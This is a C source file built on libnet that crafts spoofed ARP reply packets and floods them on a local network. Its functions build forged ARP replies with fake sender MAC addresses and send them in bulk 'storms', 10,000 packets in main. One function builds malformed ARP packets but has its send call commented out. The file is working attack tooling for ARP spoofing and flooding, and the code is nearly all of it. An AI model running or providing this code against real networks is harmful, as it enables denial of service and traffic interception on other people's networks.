
#include "./include/network.h"



u_char enet_src[6] = {0x0d, 0x0e, 0x0a, 0x0d, 0x00, 0x00};
u_char enet_dst[6] = {0x00, 0x10, 0x67, 0x00, 0xb1, 0x86};
u_char ip_src[4]   = {0x0a, 0x00, 0x00, 0x01};
u_char ip_dst[4]   = {0x0a, 0x00, 0x00, 0x02};
u_char fddi_src[6] = {0x00, 0x0d, 0x0e, 0x0a, 0x0d, 0x00};
u_char fddi_dst[6] = {0x00, 0x10, 0x67, 0x00, 0xb1, 0x86};
u_char tr_src[6]   = {0x00, 0x0d, 0x0e, 0x0a, 0x0d, 0x00};
u_char tr_dst[6]   = {0x00, 0x10, 0x67, 0x00, 0xb1, 0x86};
u_char org_code[3] = {0x00, 0x00, 0x00};


int ARP_Request_Storm(u_char *ip_dst,u_char *ip_src,u_char *enet_src,u_char *enet_dst,char *device,int storm_size)
{
	u_int32_t i;
    libnet_t *l;
	u_int8_t *packet;
    u_int32_t packet_s;
	libnet_ptag_t t;
    char errbuf[LIBNET_ERRBUF_SIZE];
	u_char enet_ffff[6] ={0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
		
	l = libnet_init(
				LIBNET_LINK_ADV,						/* injection type */
				device, 								/* network interface */
				errbuf);								/* errbuf */
	if (l == NULL)
   	{
	   fprintf(stderr, "%s", errbuf);
	   return 0;
   	}
   	else
	i = libnet_get_ipaddr4(l);	


	t = libnet_build_arp(
	            ARPHRD_ETHER,                           /* hardware addr */
	            ETHERTYPE_IP,                           /* protocol addr */
	            6,                                      /* hardware addr size */
	            4,                                      /* protocol addr size */
	            ARPOP_REPLY,                            /* operation type */
	            enet_src,                               /* sender hardware addr */
	            (u_int8_t *)&i,                         /* sender protocol addr */
	            enet_dst,                               /* target hardware addr */
	            (u_int8_t *)&i,                         /* target protocol addr */
	            NULL,                                   /* payload */
	            0,                                      /* payload size */
	            l,                                      /* libnet context */
	            0);                                     /* libnet id */
    if (t == -1)
    {
        fprintf(stderr, "Can't build ARP header: %s\n", libnet_geterror(l));
        return 0;
    }
    t = libnet_autobuild_ethernet(
            enet_ffff,                               /* ethernet destination */
            ETHERTYPE_ARP,                          /* protocol type */
            l);                                     /* libnet handle */
    if (t == -1)
    {
        fprintf(stderr, "Can't build ethernet header: %s\n",
                libnet_geterror(l));
        return 0;
    }
    if (libnet_adv_cull_packet(l, &packet, &packet_s) == -1)
    {
        fprintf(stderr, "%s", libnet_geterror(l));
    }
    else
    {
        fprintf(stderr, "packet size: %d\n", packet_s);
        libnet_adv_free_packet(l, packet);
    }
	
	send_storm(l,storm_size,packet_s);

    libnet_destroy(l);
    return 1;



}


int APR_Host_Reply_Storm(char *ip_dst,char *ip_src,u_char *enet_src,u_char *enet_dst,char *device,int storm_size)
{
	u_int32_t i;
	u_int32_t d;
    libnet_t *l;
	u_int8_t *packet;
    u_int32_t packet_s;
	libnet_ptag_t t;
    char errbuf[LIBNET_ERRBUF_SIZE];

		
	l = libnet_init(
				LIBNET_LINK_ADV,						/* injection type */
				device, 								/* network interface */
				errbuf);								/* errbuf */
	if (l == NULL)
   	{
	   fprintf(stderr, "%s", errbuf);
	   return 0;
   	}
   	else
	i = libnet_get_ipaddr4(l);	
	d = Get_long_address(ip_dst);

	t = libnet_build_arp(
	            ARPHRD_ETHER,                           /* hardware addr */
	            ETHERTYPE_IP,                           /* protocol addr */
	            6,                                      /* hardware addr size */
	            4,                                      /* protocol addr size */
	            ARPOP_REPLY,                            /* operation type */
	            enet_src,                               /* sender hardware addr */
	            (u_int8_t *)&i,                         /* sender protocol addr */
	            enet_dst,                               /* target hardware addr */
	            (u_int8_t *)&d,                         /* target protocol addr */
	            NULL,                                   /* payload */
	            0,                                      /* payload size */
	            l,                                      /* libnet context */
	            0);                                     /* libnet id */
    if (t == -1)
    {
        fprintf(stderr, "Can't build ARP header: %s\n", libnet_geterror(l));
        return 0;
    }
    t = libnet_autobuild_ethernet(
            enet_dst,                               /* ethernet destination */
            ETHERTYPE_ARP,                          /* protocol type */
            l);                                     /* libnet handle */
    if (t == -1)
    {
        fprintf(stderr, "Can't build ethernet header: %s\n",
                libnet_geterror(l));
        return 0;
    }
    if (libnet_adv_cull_packet(l, &packet, &packet_s) == -1)
    {
        fprintf(stderr, "%s", libnet_geterror(l));
    }
    else
    {
        fprintf(stderr, "packet size: %d\n", packet_s);
        libnet_adv_free_packet(l, packet);
    }
	
	send_storm(l,storm_size,packet_s);

    libnet_destroy(l);
    return 1;



}

int ARP_Grammear(char *ip_dst,char *ip_src,u_char *enet_src,u_char *enet_dst,char *device,int storm_size)
{
		u_int32_t i;
		u_int32_t d;
		libnet_t *l;
		u_int8_t *packet;
		u_int32_t packet_s;
		libnet_ptag_t t;
		u_int16_t ARP_POROTOL=0x0800;
		u_int16_t ARPHRD_TYPE=0x0000;
		u_int16_t OPCODE=0x0000;
		char errbuf[LIBNET_ERRBUF_SIZE];
		u_char enet_000[4]={0x00,0x00,0x00,0x00};
				
		l = libnet_init(
					LIBNET_LINK_ADV,						/* injection type */
					device, 								/* network interface */
					errbuf);								/* errbuf */
		if (l == NULL)
		{
		   fprintf(stderr, "%s", errbuf);
		   return 0;
		}
		else
		i = libnet_get_ipaddr4(l);	
		d = Get_long_address(ip_dst);
	
		t = libnet_build_arp(
					ARPHRD_TYPE,							/* hardware addr */
					ARP_POROTOL,							/* protocol addr */
					6,										/* hardware addr size */
					4,										/* protocol addr size */
					OPCODE,							        /* operation type */
					enet_src,								/* sender hardware addr */
					(u_int8_t *)&i, 						/* sender protocol addr */
					enet_000,								/* target hardware addr */
					(u_int8_t *)&d, 						/* target protocol addr */
					NULL,									/* payload */
					0,										/* payload size */
					l,										/* libnet context */
					0); 									/* libnet id */
		if (t == -1)
		{
			fprintf(stderr, "Can't build ARP header: %s\n", libnet_geterror(l));
			return 0;
		}
		t = libnet_autobuild_ethernet(
				enet_dst,								/* ethernet destination */
				ETHERTYPE_ARP,							/* protocol type */
				l); 									/* libnet handle */
		if (t == -1)
		{
			fprintf(stderr, "Can't build ethernet header: %s\n",
					libnet_geterror(l));
			return 0;
		}
		if (libnet_adv_cull_packet(l, &packet, &packet_s) == -1)
		{
			fprintf(stderr, "%s", libnet_geterror(l));
		}
		else
		{
			fprintf(stderr, "packet size: %d\n", packet_s);
			libnet_adv_free_packet(l, packet);
		}
		
		//send_storm(l,storm_size,packet_s);
	
		libnet_destroy(l);
		return 1;
	


}

int 
main(int argc, char *argv[])
{	
	

	u_int32_t addr= Get_long_address("192.168.1.1");

    int c;
    u_int32_t i;
    libnet_t *l;
    libnet_ptag_t t;
    char *device = NULL;
    u_int8_t *packet;
    u_int32_t packet_s;
    char errbuf[LIBNET_ERRBUF_SIZE];
	int pcap_count=0;

    printf("libnet 1.1 packet shaping: ARP[link -- autobuilding ethernet]\n"); 

    if (argc > 1)
    {
         device = argv[1];
    }

    l = libnet_init(
            LIBNET_LINK_ADV,                        /* injection type */
            device,                                 /* network interface */
            errbuf);                                /* errbuf */

    if (l == NULL)
    {
        fprintf(stderr, "%s", errbuf);
        exit(EXIT_FAILURE);
    }
	else

    /*
     *  Build the packet, remmebering that order IS important.  We must
     *  build the packet from lowest protocol type on up as it would
     *  appear on the wire.  So for our ARP packet:
     *
     *  -------------------------------------------
     *  |  Ethernet   |           ARP             |
     *  -------------------------------------------
     *         ^                     ^
     *         |------------------   |
     *  libnet_build_ethernet()--|   |
     *                               |
     *  libnet_build_arp()-----------|
     */
	 
    i = libnet_get_ipaddr4(l);
  
    t = libnet_build_arp(
            ARPHRD_ETHER,                           /* hardware addr */
            ETHERTYPE_IP,                           /* protocol addr */
            6,                                      /* hardware addr size */
            4,                                      /* protocol addr size */
            ARPOP_REPLY,                            /* operation type */
            enet_src,                               /* sender hardware addr */
            (u_int8_t *)&i,                         /* sender protocol addr */
            enet_dst,                               /* target hardware addr */
            (u_int8_t *)&i,                         /* target protocol addr */
            NULL,                                   /* payload */
            0,                                      /* payload size */
            l,                                      /* libnet context */
            0);                                     /* libnet id */
    if (t == -1)
    {
        fprintf(stderr, "Can't build ARP header: %s\n", libnet_geterror(l));
        goto bad;
    }

    t = libnet_autobuild_ethernet(
            enet_dst,                               /* ethernet destination */
            ETHERTYPE_ARP,                          /* protocol type */
            l);                                     /* libnet handle */
    if (t == -1)
    {
        fprintf(stderr, "Can't build ethernet header: %s\n",
                libnet_geterror(l));
        goto bad;
    }


    if (libnet_adv_cull_packet(l, &packet, &packet_s) == -1)
    {
        fprintf(stderr, "%s", libnet_geterror(l));
    }
    else
    {
        fprintf(stderr, "packet size: %d\n", packet_s);
        libnet_adv_free_packet(l, packet);
    }
	
	send_storm(l,10000,packet_s);

    libnet_destroy(l);
    return (EXIT_SUCCESS);
bad:
    libnet_destroy(l);
    return (EXIT_FAILURE);
}




